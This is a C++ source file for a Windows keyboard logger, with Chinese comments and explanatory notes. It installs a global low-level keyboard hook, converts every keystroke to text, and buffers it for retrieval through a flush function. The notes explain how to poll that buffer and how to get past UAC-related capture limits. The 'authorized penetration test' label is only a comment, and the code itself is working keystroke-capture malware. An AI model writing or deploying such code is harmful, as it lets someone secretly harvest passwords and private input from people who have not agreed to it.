```cpp
// keylogger.cpp
// 编译: cl /EHsc /W4 keylogger.cpp user32.lib
// 用途: 授权渗透测试中的按键捕获演示。仅缓冲在内存中,由 FlushKeyBuffer() 取出。

#include <windows.h>
#include <string>
#include <vector>
#include <mutex>
#include <cstdio>

static std::mutex        g_bufMutex;
static std::wstring      g_keyBuffer;

// 将 VK code 翻译为可读文本(含可打印字符与常见控制键)
static std::wstring VkToString(DWORD vk, const KBDLLHOOKSTRUCT* info)
{
    BYTE kb[256] = { 0 };
    GetKeyboardState(kb);

    WCHAR ch[8] = { 0 };
    // ToUnicode 可能返回 -1(死键),这里只处理正常返回
    int ret = ToUnicode(vk, info->scanCode, kb, ch, 8, 0);
    if (ret > 0)
        return std::wstring(ch, ret);

    switch (vk)
    {
        case VK_RETURN:    return L"[ENTER]";
        case VK_BACK:      return L"[BKSP]";
        case VK_TAB:       return L"[TAB]";
        case VK_ESCAPE:    return L"[ESC]";
        case VK_SPACE:     return L" ";
        case VK_LCONTROL:  case VK_RCONTROL: return L"[CTRL]";
        case VK_LSHIFT:    case VK_RSHIFT:   return L"[SHIFT]";
        case VK_LMENU:     case VK_RMENU:    return L"[ALT]";
        case VK_LWIN:      case VK_RWIN:     return L"[WIN]";
        case VK_CAPITAL:   return L"[CAPS]";
        case VK_DELETE:    return L"[DEL]";
        case VK_LEFT:      return L"[LEFT]";
        case VK_RIGHT:     return L"[RIGHT]";
        case VK_UP:        return L"[UP]";
        case VK_DOWN:      return L"[DOWN]";
        default: break;
    }
    return L"";
}

static void AppendToBuffer(const std::wstring& s)
{
    std::lock_guard<std::mutex> lock(g_bufMutex);
    g_keyBuffer += s;
}

// 供调用方周期性调用:取走并清空当前缓冲区
std::wstring FlushKeyBuffer()
{
    std::lock_guard<std::mutex> lock(g_bufMutex);
    std::wstring out;
    out.swap(g_keyBuffer);   // O(1) 转移,g_keyBuffer 置空
    return out;
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        const KBDLLHOOKSTRUCT* info = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        if (!(info->flags & LLKHF_INJECTED))   // 可选:忽略软件注入的按键,便于区分真实输入
        {
            std::wstring s = VkToString(info->vkCode, info);
            if (!s.empty())
                AppendToBuffer(s);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

int main()
{
    // 控制台输出需要正确处理 Unicode
    _setmode(1, 0x00020000); // _O_U16TEXT,需 <fcntl.h>(此处省略,也可用 wprintf + 设置)

    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                   GetModuleHandleW(nullptr), 0);
    if (!hook)
    {
        wprintf(L"SetWindowsHookEx failed: %lu\n", GetLastError());
        return 1;
    }

    wprintf(L"Hook installed. Capturing keys... Ctrl+C to exit.\n");

    MSG msg;
    BOOL ret;
    while ((ret = GetMessageW(&msg, nullptr, 0, 0)) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(hook);

    std::wstring remaining = FlushKeyBuffer();
    if (!remaining.empty())
        wprintf(L"Flushed on exit: %s\n", remaining.c_str());

    return 0;
}
```

要点说明:

- **线程模型**:`WH_KEYBOARD_LL` 的回调由安装钩子的线程的消息循环驱动,`GetMessageW` 循环不可省略,否则钩子静默失效。回调应尽量快,避免拖慢系统输入。
- **FlushKeyBuffer()** 使用 `swap` 转移内容,锁粒度小、无拷贝开销;可在独立线程定时调用做轮询,或集成到你的报告生成流程。
- **`LLKHF_INJECTED` 过滤**:测试中如果用脚本模拟输入,注意这个标志会把注入按键排除,按需保留或删除。
- **局限性**:低级钩子拿不到已登录用户之外的会话、UAC 提升后的部分输入可能被截断(需要 UIAccess 或以提权进程运行);`ToUnicode` 对死键(如某些输入法组合)返回 -1 的情况只做了静默忽略。

